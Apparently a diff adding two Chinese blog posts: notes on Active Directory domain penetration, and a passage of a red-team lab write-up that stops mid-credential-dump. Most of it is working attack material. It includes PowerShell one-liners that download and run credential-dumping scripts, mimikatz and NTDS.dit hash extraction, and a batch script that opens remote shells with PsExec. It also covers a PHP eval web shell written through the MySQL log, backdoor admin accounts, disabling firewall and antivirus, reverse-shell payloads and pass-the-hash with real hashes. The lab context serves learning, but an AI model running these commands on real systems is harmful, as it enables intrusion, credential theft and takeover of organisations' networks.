@@ -66,6 +66,1120 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-域渗透" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/02/17/%E5%9F%9F%E6%B8%97%E9%80%8F/" class="article-date">
+  <time class="dt-published" datetime="2020-02-17T04:33:47.825Z" itemprop="datePublished">2020-02-17</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/02/17/%E5%9F%9F%E6%B8%97%E9%80%8F/">域渗透</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="域渗透学习笔记"><a href="#域渗透学习笔记" class="headerlink" title="域渗透学习笔记"></a>域渗透学习笔记</h1><h2 id="名词-缩写"><a href="#名词-缩写" class="headerlink" title="名词/缩写"></a>名词/缩写</h2><p> 活动目录（Active Directory），AD：活动目录是WindowsServer在网络环境中提供的“资源目录”。活动目录是储存着域中相关资源信息的目录，例如计算机，用户组，数据库，服务器，打印机，用户属性（权限等），就像一个数据库。<br>域控（Domain Controller），DC：安装了AD的服务器就是域控制器，即有AD的计算机就是DC。 </p>
+<h2 id="什么是域"><a href="#什么是域" class="headerlink" title="什么是域"></a>什么是域</h2><p> 将网络中多台计算机逻辑上组织到一起，进行集中管理，这种区别于工作组的逻辑环境叫做域，域是组织与存储资源的核心管理单元，在域中，至少有一台域控制器，域控制器中保存着整个域的用户帐号和安全数据库。 </p>
+<h2 id="域的特点"><a href="#域的特点" class="headerlink" title="域的特点"></a>域的特点</h2><p> 域成员计算机在登录的时候可以选择登录到域中或此计算机，登陆到域中的时候，身份验证是采用Kerberos协议在域控制器上进行的，登陆到此计算机则是通过SAM来进行NTLM验证的</p>
+<p> 默认情况下，域用户可以登录到域中所有的工作站，不包括域控制器，管理员也可以指定具体的计算机，域用户信息保存在活动目录中</p>
+<h2 id="一些其他关于域的知识"><a href="#一些其他关于域的知识" class="headerlink" title="一些其他关于域的知识"></a>一些其他关于域的知识</h2><h3 id="DNS定位域控制器"><a href="#DNS定位域控制器" class="headerlink" title="DNS定位域控制器"></a>DNS定位域控制器</h3><p>DNS负责将域名解析成IP地址</p>
+<p>内网的DNS则可以定位DC，域会有名称，比如domaintest。域会向DNS注册这个名称，即SRV记录。域中的计算机访问SRV来进而访问DC。</p>
+<p>通常DNS和DC会安装在同一计算机上，因而此计算的本地连接DNS要指向自身。</p>
+<h2 id="域渗透思路"><a href="#域渗透思路" class="headerlink" title="域渗透思路"></a>域渗透思路</h2><p> 通过域成员主机，定位出域控制器IP及域管理员账号，利用域成员主机作为跳板，扩大渗透范围，利用域管理员可以登陆域中任何成员主机的特性，定位出域管理员登陆过的主机IP，设法从<strong>域成员主机内存中</strong>dump出域管理员密码，进而拿下域控制器、渗透整个内网。 </p>
+<h2 id="域渗透常用命令"><a href="#域渗透常用命令" class="headerlink" title="域渗透常用命令"></a>域渗透常用命令</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><pre><code>dsquery server #得到域控制器的IP</code></pre><p><img src="http://www.xmrseo.com/content/uploadfile/201805/dad51527168524.jpg" alt="image886"></p>
+<p><code>net group &quot;domain controllers&quot; /domain</code>: 得到域控制器主机名 </p>
+<p> 注意通过该指令得到的机器名后面会多一个$符号</p>
+<p><code>net group &quot;domain admins&quot; /domain</code>  : 查询域管理用户 </p>
+<p><code>net user /domain</code>查看所有域用户</p>
+<p><code>net config workstation</code> : 查询当前登陆域 </p>
+<p><code>net accounts /domain</code>:  查询域密码策略 </p>
+<p><code>wmic qfe</code> : 查看补丁信息 </p>
+<p><code>wmic os</code>:  查看操作系统类型 </p>
+<p><code>ipconfig /all</code>查询本机IP段，所在域等</p>
+<p><code>tasklist /S ip /U domain\username /P /V</code>查看远程计算机进程列表</p>
+<p> 有一个特殊用户叫做krbtgt，该用户是用于Kerberos身份验证的帐户，获得了该用户的hash，就可以伪造票据进行票据传递攻击了 </p>
+<h4 id="批量查找-域管理员登陆过目标计算机"><a href="#批量查找-域管理员登陆过目标计算机" class="headerlink" title="批量查找 域管理员登陆过目标计算机"></a>批量查找 域管理员登陆过目标计算机</h4><pre><code class="bat">@echo off
+echo check ip addr config file...
+if not exist ip.txt echo ip addr config file ip.txt does not exist! &amp; goto end
+echo read and analysis file...
+for /F &quot;eol=#&quot; %%i in (ip.txt) do echo %%i &amp;(echo %%i &amp;tasklist /s %%i /u administrator /p mytest2010 /v) &gt;&gt;d:\result.txt
+:end
+exit</code></pre>
+<h4 id="批量反弹cmdshell"><a href="#批量反弹cmdshell" class="headerlink" title="批量反弹cmdshell"></a>批量反弹cmdshell</h4><pre><code class="cmd">@echo off
+echo check ip addr config file...
+if not exist ip.txt echo ip addr config file ip.txt does not exist! &amp; goto end
+echo read and analysis file...
+for /F &quot;eol=#&quot; %%i in (ip.txt) do start PsExec.exe \\%%i -accepteula -u administrator -p &quot;123456&quot; cmd &amp; start cmd /c PsExec.exe \\%%i -u administrator -p &quot;123456&quot; cmd
+:end
+exit</code></pre>
+<h3 id="访问内网其他主机"><a href="#访问内网其他主机" class="headerlink" title="访问内网其他主机"></a>访问内网其他主机</h3><p> net use建立Ipc$连接、wmic指令连接、采用rdp方式连接 , psexec进行远程连接 </p>
+<p><img src="http://www.xmrseo.com/content/uploadfile/201805/dad51527169390.jpg" alt="image2183"></p>
+<p><code>net use \\ip\ipc$ pawword /user:username</code>建立IPC会话</p>
+<h3 id="抓取内存中的hash-密码"><a href="#抓取内存中的hash-密码" class="headerlink" title="抓取内存中的hash/密码"></a>抓取内存中的hash/密码</h3><p>抓明文</p>
+<pre><code>powershell IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#39;); Invoke-Mimikatz -DumpCerts</code></pre><h4 id="普通hash"><a href="#普通hash" class="headerlink" title="普通hash"></a>普通hash</h4><p>抓hash</p>
+<pre><code>powershell IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1&#39;);Get-PassHashes</code></pre><p>抓取明文:<code>mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords full&quot; exit</code></p>
+<p>抓取hash:<code>mimikatz log &quot;privilege::debug&quot; &quot;lsadump::lsa /patch&quot; exit</code></p>
+<p><code>mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::dcsync /domain:god.org /all /csv&quot; exit</code></p>
+<h4 id="域hash"><a href="#域hash" class="headerlink" title="域hash"></a>域hash</h4><p>NTDS.dit获取域控hash</p>
+<p>这个思路在域渗透中尤为重要，因为这里面包含着所有域用户的hash，当然该思路只对DC生效。</p>
+<p>手动导出NTDS.dit和System-hive，本地或目标机导hash，因为，如果域足够大，该文件也会特别大。</p>
+<p><code>ntdsutil &quot;ac i ntds&quot; ifm &quot;create full c:\users\tmp&quot; q q</code></p>
+<p><code>NTDSDumpEx -d ntds.dit -s system -o domain.txt</code>:注意-d 为ntds.dit路径,-s为system(导出的)路径</p>
+<p><img src="https://image.3001.net/images/20191022/1571757314_5daf1d0242611.png!small" alt="image3247"></p>
+<pre><code>python secretsdump.py -system SYSTEM -ntds ntds.dit local
+python secretsdump.py rabbitmask:1q2w3e4r!@192.168.15.181
+</code></pre><p><img src="https://image.3001.net/images/20191022/1571757406_5daf1d5ee8ee7.png!small" alt="image3460"></p>
+<p><img src="https://image.3001.net/images/20191022/1571757426_5daf1d72d86f0.png!small" alt="image3545"></p>
+<h3 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h3><pre><code>net user ccreater Abc1234 /add
+net localgroup administrators ccreater /add
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f
+</code></pre><h3 id="域控提取域用户hash"><a href="#域控提取域用户hash" class="headerlink" title="域控提取域用户hash"></a>域控提取域用户hash</h3><h4 id="Ntdsutil"><a href="#Ntdsutil" class="headerlink" title="Ntdsutil"></a>Ntdsutil</h4><p> ntdsutil.exe是域控制器自带的域数据库管理工具，从windows 2008就默认自带了 </p>
+<pre><code>Ntdsutil 
+    snapshot—activate instance ntds
+    create
+    mount {guid}
+copy 装载点\windows\NTDS\ntds.dit d:\ntds_save.dit</code></pre><p><img src="http://www.xmrseo.com/content/uploadfile/201805/dad51527169954.jpg" alt="image4044"></p>
+<p><img src="http://www.xmrseo.com/content/uploadfile/201805/dad51527170055.jpg" alt="image4122"></p>
+<p> 最后执行 </p>
+<pre><code>unmount {guid}
+delete {guid}
+quit</code></pre><p> 删除装载点即可，避免被发现 </p>
+<p>接着上传工具QuarksPwDump到域控制器上，然后执行如下命令，成功提取用户hash</p>
+<p><code>QuarksPwDump --dump-hash-domain --ntds-file d:\ntds_save.dit</code></p>
+<h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4><p><code>mimikatz log &quot;privilege::debug&quot; &quot;lsadump::lsa /patch&quot;</code></p>
+<h3 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h3><pre><code>netsh advfirewall set allprofiles state off#关闭防火墙
+net stop windefend
+netsh firewall set opmode mode=disable
+bcdedit.exe /set{current} nx AlwaysOff#关闭DEP
+meterpreter &gt; run killav  关闭杀毒软件 </code></pre><h2 id="票据传递攻击"><a href="#票据传递攻击" class="headerlink" title="票据传递攻击"></a>票据传递攻击</h2><p> 域中每个用户的Ticket都是由krbtgt的密码Hash来计算生成的，因此只要我们拿到了krbtgt的密码Hash，就可以随意伪造Ticket，进而使用Ticket登陆域控制器，使用krbtgt用户hash生成的票据被称为Golden Ticket，此类攻击方法被称为票据传递攻击。 </p>
+<h2 id="MS14-068-pth"><a href="#MS14-068-pth" class="headerlink" title="MS14-068/pth"></a>MS14-068/pth</h2><p> 微软给出的补丁是kb3011780，在server 2000以上的域控中，如果没有打这个补丁，那么情况将比较糟糕，利用该漏洞可以将任何一个域用户提权至域管理员权限，危害极大。 </p>
+<h3 id="msf-psexec"><a href="#msf-psexec" class="headerlink" title="msf-psexec"></a>msf-psexec</h3><p>目标:192.168.52.138</p>
+<pre><code>Administrator:500:aad3b435b51404eeaad3b435b51404ee:a45a7246dd74b64a67f22fd7020f1bd8:::</code></pre><pre><code>use exploit/windows/smb/psexec
+set lhost xxx
+set lport xxx
+set rhosts 192.168.52.138
+set smbuser Administrator
+set smbpass aad3b435b51404eeaad3b435b51404ee:a45a7246dd74b64a67f22fd7020f1bd8</code></pre><h3 id="impacket-smbexec"><a href="#impacket-smbexec" class="headerlink" title="impacket_smbexec"></a>impacket_smbexec</h3><pre><code>python smbexec.py -hash aad3b435b51404eeaad3b435b51404ee:a45a7246dd74b64a67f22fd7020f1bd8Administrator@192.168.52.138
+
+or
+
+python smbexec.py -hashes :a45a7246dd74b64a67f22fd7020f1bd8 Administrator@192.168.52.138
+</code></pre><p>显然，其实它只需要NThash部分就好啦。</p>
+<h2 id="copy-于"><a href="#copy-于" class="headerlink" title="copy 于"></a>copy 于</h2><p> <a href="http://www.xmrseo.com/?post=87" target="_blank" rel="noopener">http://www.xmrseo.com/?post=87</a> </p>
+<p> <a href="https://zhengbao.wang/域渗透基础/" target="_blank" rel="noopener">https://zhengbao.wang/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/</a> </p>
+<p> <a href="https://www.freebuf.com/articles/system/217681.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/217681.html</a> </p>
+<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/02/17/域渗透/">http://blog.ccreater.top/2020/02/17/域渗透/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://blog.ccreater.top/2020/02/17/%E5%9F%9F%E6%B8%97%E9%80%8F/" data-id="ck917a7d7003ou8v09c0p5ukt" data-title="域渗透" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">渗透</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-vulnstackATT&amp;CK红队评估靶场1渗透记录" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/02/17/vulnstackATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E9%9D%B6%E5%9C%BA1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/" class="article-date">
+  <time class="dt-published" datetime="2020-02-17T04:32:09.142Z" itemprop="datePublished">2020-02-17</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/02/17/vulnstackATT&CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E9%9D%B6%E5%9C%BA1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/">vulnstackATT&amp;CK红队评估靶场1渗透记录</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="vulnstackATT-amp-CK红队评估靶场1渗透记录"><a href="#vulnstackATT-amp-CK红队评估靶场1渗透记录" class="headerlink" title="vulnstackATT&amp;CK红队评估靶场1渗透记录"></a>vulnstackATT&amp;CK红队评估靶场1渗透记录</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><p>已知靶机在192.168.2.*上</p>
+<pre><code>
+[*] Nmap: Nmap scan report for stu1.lan (192.168.2.142)
+[*] Nmap: Nmap scan report for kali.lan (192.168.2.158)</code></pre><p>目标就是192.168.2.142</p>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre><code>[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-16 10:48 CST
+[*] Nmap: Stats: 0:03:23 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+[*] Nmap: SYN Stealth Scan Timing: About 54.92% done; ETC: 10:54 (0:02:47 remaining)
+[*] Nmap: Stats: 0:03:23 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+[*] Nmap: SYN Stealth Scan Timing: About 54.97% done; ETC: 10:54 (0:02:47 remaining)
+[*] Nmap: Stats: 0:04:40 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+[*] Nmap: SYN Stealth Scan Timing: About 75.24% done; ETC: 10:54 (0:01:32 remaining)
+[*] Nmap: Nmap scan report for stu1.lan (192.168.2.142)
+[*] Nmap: Host is up (0.00062s latency).
+[*] Nmap: Not shown: 65523 closed ports
+[*] Nmap: PORT     STATE SERVICE
+[*] Nmap: 80/tcp   open  http
+[*] Nmap: 135/tcp  open  msrpc
+[*] Nmap: 139/tcp  open  netbios-ssn
+[*] Nmap: 445/tcp  open  microsoft-ds
+[*] Nmap: 1025/tcp open  NFS-or-IIS
+[*] Nmap: 1026/tcp open  LSA-or-nterm
+[*] Nmap: 1027/tcp open  IIS
+[*] Nmap: 1028/tcp open  unknown
+[*] Nmap: 1029/tcp open  ms-lsa
+[*] Nmap: 1030/tcp open  iad1
+[*] Nmap: 3306/tcp open  mysql
+[*] Nmap: 3389/tcp open  ms-wbt-server
+[*] Nmap: MAC Address: 00:0C:29:A7:C1:B2 (VMware)
+</code></pre><h2 id="web服务"><a href="#web服务" class="headerlink" title="web服务"></a>web服务</h2><p>先去看看web服务吧</p>
+<pre><code>[10:52:41] 200 -   11B  - /index.php
+[10:52:45] 200 -   71KB - /phpinfo.php
+[10:52:45] 200 -    4KB - /phpMyAdmin/
+[10:52:53] 200 -    2B  - /1.php</code></pre><p>看了一下只有phpmyadmin有用</p>
+<p>试着弱密码登陆,不直接用mysql客户端登陆是因为怕他们禁止远程ip</p>
+<p>网上随便找了一个爆破phpmyadmin的</p>
+<p><img src="https://i.loli.net/2020/02/16/vIQt8APEoGW7aKT.png" alt="image1782"></p>
+<p>弱密码登陆成功</p>
+<p>尝试sql写shell</p>
+<pre><code>1. select &quot;test&quot; into outfile &quot;C:/phpStudy/WWW/test.php&quot;;
+2. 日志写shell
+mysql&gt; show variables like &#39;%general%&#39;#先看下当前mysql默认的日志位置在什么地方,&#39;C:\phpStudy\MySQL\data\stu1.log&#39; 顺手把原来正常的日志路径稍微记录下,等会儿干完活儿再把它恢复回来
+mysql&gt; set global general_log = on#默认基本都是关闭的,不然这个增删改查的记录量可能会非常大
+mysql&gt;  set global general_log_file = &#39;C:/phpStudy/WWW/test.php&#39;;#此时,再把原本的日志文件位置指向到目标网站的物理路径
+mysql&gt; select &#39;&lt;?php eval($_POST[request]);?&gt;&#39;#开始写shell,这里就是个普通的shell,不免杀,如果有waf的话,可以用下面的免杀shell
+
+
+##写完之后记得恢复
+mysql&gt; set global general_log_file = &#39;C:\phpStudy\MySQL\data\stu1.log&#39;;
+mysql&gt; set global general_log = off;</code></pre><p><img src="https://i.loli.net/2020/02/16/fUuoVKeY1BMhNXm.png" alt="image2457"></p>
+<p>成功写入shell</p>
+<p><img src="https://i.loli.net/2020/02/16/TKF1n7r5Am2cfBj.png" alt="image2535"></p>
+<p>直接拿到管理员权限了</p>
+<h2 id="meterpreter后攻击"><a href="#meterpreter后攻击" class="headerlink" title="meterpreter后攻击"></a>meterpreter后攻击</h2><pre><code>netsh advfirewall set allprofiles state off#关闭防火墙
+net stop windefend
+netsh firewall set opmode mode=disable
+bcdedit.exe /set{current} nx AlwaysOff#关闭DEP
+meterpreter &gt; run killav  关闭杀毒软件 </code></pre><h2 id="设置代理"><a href="#设置代理" class="headerlink" title="设置代理"></a>设置代理</h2><pre><code>msfvenom -p php/meterpreter/reverse_tcp -a php -f raw &gt; /tmp/2.php
+use exploit/multi/handler
+set payload php/meterpreter/reverse_tcp
+show options
+run autoroute -s 192.168.52.143
+msf &gt; use auxiliary/server/socks4a   设置socks4代理模块
+msf auxiliary(socks4a) &gt; show options 
+msf auxiliary(socks4a) &gt; run
+vim /etc/proxychains.conf   修改代理监听端口,和前面端口一致
+</code></pre><p>用msf设置的代理不知道为啥不太稳定</p>
+<p>于是我用reGeorg来设置代理</p>
+<p>emmmm,还是ew好用</p>
+<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>因为socks无法代理icmp协议(ping使用的),所以namp要用<code>-Pn</code>选项</p>
+<pre><code>Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-16 13:50 ?D1��������?����??
+Nmap scan report for 192.168.52.138
+Host is up (0.00s latency).
+MAC Address: 00:0C:29:3F:5D:A9 (VMware)
+Nmap scan report for 192.168.52.141
+Host is up (0.00s latency).
+MAC Address: 00:0C:29:6D:39:34 (VMware)
+Nmap scan report for www.qiyuanxuetang.net (192.168.52.143)
+Host is up.
+Nmap done: 256 IP addresses (3 hosts up) scanned in 5.01 seconds
+</code></pre><p>接下来的目标是<code>192.168.52.138</code>,<code>192.168.52.141</code></p>
+<p>192.168.52.138</p>
+<pre><code>Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-16 13:57 ?D1��������?����??
+Nmap scan report for 192.168.52.138
+Host is up (0.00031s latency).
+Not shown: 983 filtered ports
+PORT      STATE SERVICE
+53/tcp    open  domain
+80/tcp    open  http
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+MAC Address: 00:0C:29:3F:5D:A9 (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 5.04 seconds</code></pre><p>Running: Microsoft Windows 7|8|Vista|2008</p>
+<p>192.168.52.141</p>
+<pre><code>21/tcp   open  ftp
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+777/tcp  open  multiling-http
+1025/tcp open  NFS-or-IIS
+1026/tcp open  LSA-or-nterm
+1030/tcp open  iad1
+1031/tcp open  iad2
+6002/tcp open  X11:2
+7001/tcp open  afs3-callback
+7002/tcp open  afs3-prserver
+8099/tcp open  unknown</code></pre><p>Running: Microsoft Windows XP|2003</p>
+<p>弱密码登陆ftp,发现啥也弄不了动不动500</p>
+<p>因为操作系统比较旧,可以试试MS17-010,成功!</p>
+<p>但是只有ms17_010_command才利用成功,只能一次一次set command来执行命令</p>
+<p>后来找到<code>cmd/windows/powershell_bind_tcp</code></p>
+<p>能直接返回一个powershell</p>
+<p>添加用户</p>
+<pre><code>net user ccreater Abc1234 /add
+net localgroup administrators ccreater /add
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</code></pre><h2 id="域控"><a href="#域控" class="headerlink" title="域控"></a>域控</h2><pre><code>net group &quot;domain controllers&quot; /domain 
+得到域控制器主机名:OWA
+wmic qfe 
+查询安装补丁
+http://support.microsoft.com/?kbid=976902  OWA     Update                    KB976902               GOD\Administrator  11/21/2010 
+
+net user /domain
+查询域所有用户
+-------------------------------------------------------------------------------
+Administrator            gqy                      Guest                    
+krbtgt                   ligang                   liukaifeng01   
+</code></pre><p>没有安装kb3011780,可以将任何一个域用户提权至域管理员权限</p>
+<p>域控的ip是:<code>192.168.52.138</code></p>
+<pre><code>Authentication Id : 0 ; 996 (00000000:000003e4)
+Domain : GOD / S-1-5-21-2952760202-1353902439-2381784089
+Session           : Service from 0
+User Name         : OWA$
+Domain            : GOD
+Logon Server      : (null)
+Logon Time        : 2020/2/16 20:59:23
+SID               : S-1-5-20
+    msv :    
+     [00000003] Primary
+     * Username : OWA$
+     * Domain   : GOD
+     * NTLM     : f8ddc71a57488df64708651271185969
+     * SHA1     : 93d8566dd8e60d8a6bf47d86fd8c1d47a82bacdf
+    tspkg :    
+    wdigest :    
+     * Username : OWA$
+     * Domain   : GOD
+     * Password : 03 eb 3e 5e bb 37 5d 2d a7 1c c3 e8 c2 10 2f 82 95 04 cf 25 e8 fb c2 be 28 71 04 c9 5a 22 11 36 2c 07 b3 f1 83 45 67 70 b7 2b 2c 89 44 76 e6 b9 5f 50 79 31 d6 8b a4 6e fb 28 2f bf c8 14 ee e6 c0 00 9f 5c f2 28 26 ef 97 99 74 5e 8a c2 10 86 0e ad 05 05 08 7c 8e ec e7 49 e9 eb df a6 80 2a c7 43 1c 27 6c cf 76 ff 89 ec 03 ed b2 c7 79 45 36 97 31 20 db c8 b3 2d 6f cb d5 53 d2 a1 e0 e7 18 86 94 2e c2 a8 8e 46 4c 54 01 dd 30 c5 0d 7e ce de 7e b5 ff a1 6b e5 34 a6 c2 dc 0d 57 0f 99 1b bf e1 49 a2 92 37 19 76 df 97 eb 5f 52 7c 21 ae 93 e3 5e ed 2d 87 17 6c f9 e2 12 9a d9 32 a3 33 a2 3b 8f 6d 38 f7 7b fb b5 bb 3b cb 1a 93 7a 98 e3 b9 60 ed 5d 74 89 1b d0 d0 90 56 54 7f 02 93 72 8a da 03 e8 cc f6 1b e0 be 0f 54 3e 57 65 
+    kerberos :    
+     * Username : owa$
+     * Domain   : GOD.ORG
+     * Password : 03 eb 3e 5e bb 37 5d 2d a7 1c c3 e8 c2 10 2f 82 95 04 cf 25 e8 fb c2 be 28 71 04 c9 5a 22 11 36 2c 07 b3 f1 83 45 67 70 b7 2b 2c 89 44 76 e6 b9 5f 50 79 31 d6 8b a4 6e fb 28 2f bf c8 14 ee e6 c0 00 9f 5c f2 28 26 ef 97 99 74 5e 8a c2 10 86 0e ad 05 05 08 7c 8e ec e7 49 e9 eb df a6 80 2a c7 43 1c 27 6c cf 76 ff 89 ec 03 ed b2 c7 79 45 36 97 31 20 db c8 b3 2d 6f cb d5 53 d2 a1 e0 e7 18 86 94 2e c2 a8 8e 46 4c 54 01 dd 30 c5 0d 7e ce de 7e b5 ff a1 6b e5 34 a6 c2 dc 0d 57 0f 99 1b bf e1 49 a2 92 37 19 76 df 97 eb 5f 52 7c 21 ae 93 e3 5e ed 2d 87 17 6c f9 e2 12 9a d9 32 a3 33 a2 3b 8f 6d 38 f7 7b fb b5 bb 3b cb 1a 93 7a 98 e3 b9 60 ed 5d 74 89 1b d0 d0 90 56 54 7f 02 93 72 8a da 03 e8 cc f6 1b e0 be 0f 54 3e 57 65 
+    ssp :    
+    credman :    
+
+Authentication Id : 0 ; 47752 (00000000:0000ba88)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 2020/2/16 20:59:18
+SID               : 
+    msv :    
+     [00000003] Primary
+     * Username : OWA$
+     * Domain   : GOD
+     * NTLM     : f8ddc71a57488df64708651271185969
+     * SHA1     : 93d8566dd8e60d8a6bf47d86fd8c1d47a82bacdf
+     * NTLM     : f8ddc71a57488df64708651271185969:93d8566dd8e60d8a6bf47d86fd8c1d47a82bacdf
+    tspkg :    
+    wdigest :    
+    kerberos :    
+    ssp :    
+    credman :    
+
+Authentication Id : 0 ; 995 (00000000:000003e3)
+Session           : Service from 0
+User Name         : IUSR
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 2020/2/16 21:00:06
+SID               : S-1-5-17
+    msv :    
+    tspkg :    
+    wdigest :    
+     * Username : (null)
+     * Domain   : (null)
+     * Password : (null)
+    kerberos :    
+    ssp :    
+    credman :    
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 2020/2/16 20:59:23
+SID               : S-1-5-19
+    msv :    
+    tspkg :    
+    wdigest :    
+     * Username : (null)
+     * Domain   : (null)
+     * Password : (null)
+    kerberos :    
+     * Username : (null)
+     * Domain   : (null)
+     * Password : (null)
+    ssp :    
+    credman :    
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : OWA$
+Domain            : GOD
+Logon Server      : (null)
+Logon Time        : 2020/2/16 20:59:17
+SID               : S-1-5-18
+    msv :    
+    tspkg :    
+    wdigest :    
+     * Username : OWA$
+     * Domain   : GOD
+     * Password : 03 eb 3e 5e bb 37 5d 2d a7 1c c3 e8 c2 10 2f 82 95 04 cf 25 e8 fb c2 be 28 71 04 c9 5a 22 11 36 2c 07 b3 f1 83 45 67 70 b7 2b 2c 89 44 76 e6 b9 5f 50 79 31 d6 8b a4 6e fb 28 2f bf c8 14 ee e6 c0 00 9f 5c f2 28 26 ef 97 99 74 5e 8a c2 10 86 0e ad 05 05 08 7c 8e ec e7 49 e9 eb df a6 80 2a c7 43 1c 27 6c cf 76 ff 89 ec 03 ed b2 c7 79 45 36 97 31 20 db c8 b3 2d 6f cb d5 53 d2 a1 e0 e7 18 86 94 2e c2 a8 8e 46 4c 54 01 dd 30 c5 0d 7e ce de 7e b5 ff a1 6b e5 34 a6 c2 dc 0d 57 0f 99 1b bf e1 49 a2 92 37 19 76 df 97 eb 5f 52 7c 21 ae 93 e3 5e ed 2d 87 17 6c f9 e2 12 9a d9 32 a3 33 a2 3b 8f 6d 38 f7 7b fb b5 bb 3b cb 1a 93 7a 98 e3 b9 60 ed 5d 74 89 1b d0 d0 90 56 54 7f 02 93 72 8a da 03 e8 cc f6 1b e0 be 0f 54 3e 57 65 
+    kerberos :    
+     * Username : owa$
+     * Domain   : GOD.ORG
+     * Password : 03 eb 3e 5e bb 37 5d 2d a7 1c c3 e8 c2 10 2f 82 95 04 cf 25 e8 fb c2 be 28 71 04 c9 5a 22 11 36 2c 07 b3 f1 83 45 67 70 b7 2b 2c 89 44 76 e6 b9 5f 50 79 31 d6 8b a4 6e fb 28 2f bf c8 14 ee e6 c0 00 9f 5c f2 28 26 ef 97 99 74 5e 8a c2 10 86 0e ad 05 05 08 7c 8e ec e7 49 e9 eb df a6 80 2a c7 43 1c 27 6c cf 76 ff 89 ec 03 ed b2 c7 79 45 36 97 31 20 db c8 b3 2d 6f cb d5 53 d2 a1 e0 e7 18 86 94 2e c2 a8 8e 46 4c 54 01 dd 30 c5 0d 7e ce de 7e b5 ff a1 6b e5 34 a6 c2 dc 0d 57 0f 99 1b bf e1 49 a2 92 37 19 76 df 97 eb 5f 52 7c 21 ae 93 e3 5e ed 2d 87 17 6c f9 e2 12 9a d9 32 a3 33 a2 3b 8f 6d 38 f7 7b fb b5 bb 3b cb 1a 93 7a 98 e3 b9 60 ed 5d 74 89 1b d0 d0 90 56 54 7f 02 93 72 8a da 03 e8 cc f6 1b e0 be 0f 54 3e 57 65 
+    ssp :    
+    credman :    
+** SAM ACCOUNT **
+
+SAM Username         : krbtgt
